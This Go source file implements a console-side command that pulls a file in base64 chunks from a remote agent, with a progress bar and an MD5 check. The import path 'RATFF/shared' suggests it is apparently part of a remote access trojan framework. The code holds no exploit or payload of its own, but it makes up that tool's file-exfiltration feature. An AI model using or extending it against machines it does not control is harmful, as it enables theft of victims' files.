package main

import (
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"os"
	"path/filepath"
	"time"

	"RATFF/shared"
)

func downloadFile(id, remotePath, localPath string) {
	filename := filepath.Base(remotePath)

	if localPath == "" || localPath == "." {
		localPath = filename
	}

	localPath = filepath.Clean(localPath)

	dir := filepath.Dir(localPath)
	if dir != "." && dir != "/" {
		if err := os.MkdirAll(dir, 0755); err != nil {
			PrintError(Tf("create_dir_failed", dir, err))
			return
		}
	}

	fileID := shared.GenerateID()

	PrintInfo(Tf("download_starting", filename, remotePath))

	payload := map[string]interface{}{
		"file_id":    fileID,
		"local_path": remotePath,
	}

	msg := waitForCommandResponseWithMsg(id, shared.CmdFileDownloadStart, payload, 10*time.Second)
	if msg == nil {
		return
	}

	if msg.Payload == nil {
		PrintError(T("download_start_failed"))
		return
	}

	if errMsg, ok := msg.Payload["error"].(string); ok {
		PrintError(Tf("download_start_failed_detail", errMsg))
		return
	}

	fileSizeF, _ := msg.Payload["file_size"].(float64)
	fileSize := int64(fileSizeF)

	outFile, err := os.Create(localPath)
	if err != nil {
		PrintError(Tf("file_create_failed", localPath, err))
		return
	}
	defer outFile.Close()

	totalChunksF, _ := msg.Payload["total_chunks"].(float64)
	totalChunks := int(totalChunksF)

	progressBar := NewProgressBar(fileSize, filename)

	md5hash := md5.New()

	for i := 0; i < totalChunks; i++ {
		chunkPayload := map[string]interface{}{
			"file_id":     fileID,
			"chunk_index": i,
		}

		chunkMsg := waitForCommandResponseWithMsg(id, shared.CmdFileDownloadChunk, chunkPayload, chunkTimeout)
		if chunkMsg == nil {
			progressBar.MarkDone()
			progressBar.Display()
			PrintError(Tf("download_chunk_failed", i))
			return
		}

		if chunkMsg.Payload == nil {
			progressBar.MarkDone()
			progressBar.Display()
			PrintError(Tf("download_chunk_empty", i))
			return
		}

		if errMsg, ok := chunkMsg.Payload["error"].(string); ok {
			progressBar.MarkDone()
			progressBar.Display()
			PrintError(Tf("download_chunk_failed_detail", i, errMsg))
			return
		}

		chunkDataB64, _ := chunkMsg.Payload["chunk_data"].(string)
		chunkData, err := base64.StdEncoding.DecodeString(chunkDataB64)
		if err != nil {
			progressBar.MarkDone()
			progressBar.Display()
			PrintError(Tf("decode_chunk_failed", err))
			return
		}

		n, err := outFile.Write(chunkData)
		if err != nil {
			progressBar.MarkDone()
			progressBar.Display()
			PrintError(Tf("write_chunk_failed", err))
			return
		}

		md5hash.Write(chunkData[:n])
		progressBar.Add(int64(n))
		progressBar.Display()
	}

	completePayload := map[string]interface{}{
		"file_id": fileID,
	}

	msg = waitForCommandResponseWithMsg(id, shared.CmdFileDownloadComplete, completePayload, 10*time.Second)
	if msg == nil {
		progressBar.MarkDone()
		progressBar.Display()
		PrintError(T("download_complete_failed"))
		return
	}

	progressBar.MarkDone()
	progressBar.Display()

	if msg.Payload != nil {
		if remoteMD5, ok := msg.Payload["md5"].(string); ok {
			localMD5 := hex.EncodeToString(md5hash.Sum(nil))
			if remoteMD5 != localMD5 {
				PrintWarn(Tf("download_md5_mismatch", localMD5, remoteMD5))
			} else {
				PrintSuccess(Tf("download_success", remotePath, localPath))
			}
		} else {
			PrintSuccess(Tf("download_success", remotePath, localPath))
		}
	}
}
